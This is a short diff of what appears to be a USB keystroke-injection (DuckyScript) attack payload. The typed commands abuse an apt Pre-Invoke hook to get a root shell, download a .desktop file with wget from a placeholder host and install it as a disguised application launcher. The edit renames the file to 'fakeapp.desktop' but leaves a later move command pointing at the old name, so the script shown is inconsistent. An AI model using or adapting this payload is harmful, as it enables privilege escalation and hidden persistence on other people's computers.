@@ -8,10 +8,10 @@ DELAY 1000
 STRING	sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
 ENTER
 DELAY 1000
-STRING sudo wget https://yoursite.com/scripts/notebookapp.desktop
+STRING sudo wget https://yoursite.com/scripts/fakeapp.desktop
 ENTER
 DELAY 1000
-STRING sudo chmod +x notebookapp.desktop
+STRING sudo chmod +x fakeapp.desktop
 ENTER
 DELAY 1000
 STRING sudo mv notebookapp.desktop /usr/local/share/applications/
